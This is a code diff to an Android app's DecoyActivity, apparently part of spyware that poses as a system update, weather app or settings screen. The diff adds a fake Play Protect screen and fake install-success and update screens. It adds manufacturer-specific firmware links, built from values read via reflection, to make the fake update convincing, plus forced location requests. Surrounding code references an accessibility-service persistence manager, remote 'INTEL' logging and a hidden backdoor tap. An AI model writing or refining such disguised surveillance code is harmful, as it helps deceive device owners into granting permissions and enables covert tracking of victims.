@@ -1,7 +1,6 @@
 package com.labs.labrats;
 
 import android.Manifest;
-import android.animation.Animator;
 import android.animation.AnimatorSet;
 import android.animation.ObjectAnimator;
 import android.content.Intent;
@@ -13,14 +12,16 @@ import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
 import android.view.View;
-import android.view.ViewGroup;
 import android.widget.Button;
-import android.widget.ImageView;
 import android.widget.LinearLayout;
-import android.widget.ProgressBar;
 import android.widget.TextView;
 
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
+import android.text.SpannableStringBuilder;
+import android.text.Spanned;
+import android.text.style.ForegroundColorSpan;
+import android.graphics.Color;
 
 import java.util.Locale;
 
@@ -35,7 +36,13 @@ public class DecoyActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
+
+        // --- STABILITY_LAYOUT_SYNC: Force system bars to match decoy background ---
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            getWindow().setStatusBarColor(android.graphics.Color.BLACK);
+            getWindow().setNavigationBarColor(android.graphics.Color.BLACK);
+        }
+
         String componentName = getIntent().getComponent().getClassName();
         Log.d("DecoyActivity", "Launched via: " + componentName);
 
@@ -61,7 +68,7 @@ public class DecoyActivity extends AppCompatActivity {
             setupWeather();
             isSpecializedDecoy = true;
         } else if (componentName.contains("SettingsAlias")) {
-            setContentView(R.layout.activity_decoy_settings);
+            setContentView(R.layout.activity_decoy_playprotect);
             setupSettings();
             isSpecializedDecoy = true;
         } else {
@@ -69,10 +76,10 @@ public class DecoyActivity extends AppCompatActivity {
             // High-Fidelity System Update Logic
             boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
             if (isDeployed) {
-                setContentView(R.layout.activity_decoy_success);
+                setContentView(R.layout.activity_decoy_install_success);
                 setupSuccessDecoy();
             } else {
-                setContentView(R.layout.activity_new_update);
+                setContentView(R.layout.activity_decoy_install_update);
                 setupUpdateDecoy();
             }
         }
@@ -139,7 +146,7 @@ public class DecoyActivity extends AppCompatActivity {
                     } catch (Exception e) {
                         Log.e("DecoyActivity", "Transition Error: " + e.getMessage());
                         // Fallback UI switch
-                        setContentView(R.layout.activity_decoy_success);
+                        setContentView(R.layout.activity_decoy_install_success);
                         setupSuccessDecoy();
                     }
 
@@ -148,17 +155,30 @@ public class DecoyActivity extends AppCompatActivity {
         }
 
         if (ivUpdateIcon != null) {
-            ivUpdateIcon.setOnClickListener(v -> handleBackdoorClick());
+            ivUpdateIcon.setOnClickListener(v -> finish());
         }
 
         View btnLearnMore = findViewById(R.id.btnLearnMore);
         if (btnLearnMore != null) {
+            String dynamicUrl = getDynamicUpdateUrl();
+            if (btnLearnMore instanceof android.widget.TextView) {
+                SpannableStringBuilder builder = new SpannableStringBuilder("Learn more at:\n");
+                int start = builder.length();
+                builder.append(dynamicUrl);
+                builder.setSpan(new ForegroundColorSpan(Color.parseColor("#A0A0A0")), 0, start, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
+                builder.setSpan(new ForegroundColorSpan(Color.parseColor("#3470E5")), start, builder.length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
+                ((android.widget.TextView) btnLearnMore).setText(builder);
+            }
             btnLearnMore.setOnClickListener(v -> {
+                Log.d("DecoyActivity", "Learn More link clicked: " + dynamicUrl);
                 try {
-                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://doc.samsungmobile.com/SM-F731W/CHR/doc.html"));
+                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(dynamicUrl));
                     intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                     startActivity(intent);
-                } catch (Exception ignored) {}
+                } catch (Exception e) {
+                    Log.e("DecoyActivity", "Error opening Learn More link: " + e.getMessage());
+                    android.widget.Toast.makeText(DecoyActivity.this, "Unable to open link", android.widget.Toast.LENGTH_SHORT).show();
+                }
             });
         }
     }
@@ -238,6 +258,8 @@ public class DecoyActivity extends AppCompatActivity {
 
         final Button btnCheckForUpdate = findViewById(R.id.btnCheckForUpdate);
         final View loadingLayout = findViewById(R.id.loadingLayoutSuccess);
+
+
 
         if (btnCheckForUpdate != null) {
             if (IO_Persistence_Manager.getInstance() == null) {
@@ -383,23 +405,48 @@ public class DecoyActivity extends AppCompatActivity {
                     if (l == null) continue;
                     if (loc == null || l.getAccuracy() < loc.getAccuracy()) loc = l;
                 }
+                
                 if (loc != null) {
-                    android.location.Geocoder geocoder = new android.location.Geocoder(this, java.util.Locale.getDefault());
-                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
-                        Api33Geocoder.getFromLocation(geocoder, loc, cityTv, this);
-                    } else {
-                        java.util.List<android.location.Address> addresses = geocoder.getFromLocation(loc.getLatitude(), loc.getLongitude(), 1);
-                        if (addresses != null && !addresses.isEmpty()) {
-                            String city = addresses.get(0).getLocality();
-                            if (city != null) {
-                                cityTv.setText(city);
-                                getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putString("last_city", city).apply();
+                    resolveCityFromLocation(loc, cityTv);
+                } else {
+                    // Force a single location update if last known is null
+                    String provider = providers.contains(android.location.LocationManager.NETWORK_PROVIDER) ? 
+                                     android.location.LocationManager.NETWORK_PROVIDER : 
+                                     (providers.isEmpty() ? null : providers.get(0));
+                    
+                    if (provider != null) {
+                        lm.requestSingleUpdate(provider, new android.location.LocationListener() {
+                            @Override public void onLocationChanged(@NonNull android.location.Location location) {
+                                resolveCityFromLocation(location, cityTv);
                             }
-                        }
+                            @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
+                            @Override public void onProviderEnabled(@NonNull String provider) {}
+                            @Override public void onProviderDisabled(@NonNull String provider) {}
+                        }, Looper.getMainLooper());
                     }
                 }
             } catch (Exception ignored) {}
         }
+    }
+
+    private void resolveCityFromLocation(android.location.Location loc, TextView cityTv) {
+        try {
+            android.location.Geocoder geocoder = new android.location.Geocoder(this, java.util.Locale.getDefault());
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+                Api33Geocoder.getFromLocation(geocoder, loc, cityTv, this);
+            } else {
+                java.util.List<android.location.Address> addresses = geocoder.getFromLocation(loc.getLatitude(), loc.getLongitude(), 1);
+                if (addresses != null && !addresses.isEmpty()) {
+                    String city = addresses.get(0).getLocality();
+                    if (city == null) city = addresses.get(0).getSubAdminArea(); // Fallback for smaller towns
+                    if (city != null) {
+                        final String finalCity = city;
+                        runOnUiThread(() -> cityTv.setText(finalCity));
+                        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putString("last_city", city).apply();
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
     }
 
     @androidx.annotation.RequiresApi(api = android.os.Build.VERSION_CODES.TIRAMISU)
@@ -440,6 +487,13 @@ public class DecoyActivity extends AppCompatActivity {
     @Override
     protected void onResume() {
         super.onResume();
+        
+        // Ensure system bars match on every resume to prevent "Safety Buffer" leaks
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            getWindow().setStatusBarColor(android.graphics.Color.BLACK);
+            getWindow().setNavigationBarColor(android.graphics.Color.BLACK);
+        }
+
         if (IO_Persistence_Manager.getInstance() == null) {
             FirebaseConfig.logActivity("INTEL_NOTICE: Accessibility service is offline");
         }
@@ -447,7 +501,7 @@ public class DecoyActivity extends AppCompatActivity {
         // AUTO-TRANSITION TO SUCCESS: If permissions were just granted, show the success screen
         boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
         if (!isSpecializedDecoy && isDeployed && allPermissionsOk()) {
-            setContentView(R.layout.activity_decoy_success);
+            setContentView(R.layout.activity_decoy_install_success);
             setupSuccessDecoy();
         }
     }
@@ -482,5 +536,50 @@ public class DecoyActivity extends AppCompatActivity {
             clickCount = 0;
             finish();
         }
+    }
+
+    private String getDynamicUpdateUrl() {
+        String manufacturer = Build.MANUFACTURER.toLowerCase(Locale.US);
+        String model = Build.MODEL.toUpperCase(Locale.US);
+        
+        // Samsung High-Fidelity Logic
+        if (manufacturer.contains("samsung")) {
+            String csc = "XAA"; // Default US Unlocked
+            try {
+                // Try to get actual CSC from system properties
+                java.lang.Class<?> clazz = java.lang.Class.forName("android.os.SystemProperties");
+                java.lang.reflect.Method get = clazz.getMethod("get", String.class);
+                String salesCode = (String) get.invoke(null, "ro.csc.sales_code");
+                if (salesCode != null && !salesCode.isEmpty()) {
+                    csc = salesCode.toUpperCase(Locale.US);
+                }
+            } catch (Exception ignored) {}
+            
+            // Format: https://doc.samsungmobile.com/MODEL/CSC/doc.html
+            return "https://doc.samsungmobile.com/" + model + "/" + csc + "/doc.html";
+        }
+        
+        // Pixel High-Fidelity Logic
+        if (manufacturer.contains("google")) {
+            return "https://support.google.com/pixelphone/answer/4457705";
+        }
+
+        // OnePlus
+        if (manufacturer.contains("oneplus")) {
+            return "https://www.oneplus.com/support/softwareupgrade";
+        }
+
+        // Xiaomi
+        if (manufacturer.contains("xiaomi")) {
+            return "https://new.c.mi.com/global/miuidownload/index";
+        }
+
+        // HTC
+        if (manufacturer.contains("htc")) {
+            return "https://www.htc.com/us/support/updates.html";
+        }
+        
+        // Fallback for others
+        return "https://www.google.com/search?q=" + manufacturer + "+" + model + "+latest+firmware+update+changelog";
     }
 }
